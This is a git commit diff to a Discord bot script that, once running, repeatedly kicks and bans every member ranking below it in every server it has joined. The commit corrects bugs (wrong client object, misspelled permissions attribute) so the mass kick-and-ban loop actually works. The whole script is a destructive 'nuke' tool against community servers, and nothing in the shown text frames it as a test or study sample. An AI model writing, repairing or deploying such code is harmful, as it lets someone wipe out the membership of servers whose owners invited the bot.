7e5cc672e41d68c844f3424a6ebda1d4a85f6e19
Loft579 <51039400+Loft579@users.noreply.github.com>
2019-12-28 17:26:37 -0300

    Update bot.py

--- bot.py
+++ bot.py
@@ -6,19 +6,20 @@ import os
 import time
 
 client = discord.Client()
-bot = commands.Bot(command_prefix = "p")
+bot = commands.Bot(command_prefix = "null")
     
 @bot.listen()
 async def on_ready():
     while True:
         await asyncio.sleep(2)
-        for mmr in client.get_all_members():
+        for mmr in bot.get_all_members():
             if mmr.top_role.position >= mmr.guild.me.top_role.position:
                 continue
-            if mmr.guild.me.permission.kick_members:
+            if mmr.guild.me.permissions.kick_members:
                 await mmr.kick()
-            if mmr.guild.me.permission.ban_members:
+            if mmr.guild.me.permissions.ban_members:
                 await mmr.ban()
 
 TOKEN = os.environ['BOT_TOKEN']
 bot.run(TOKEN)
+
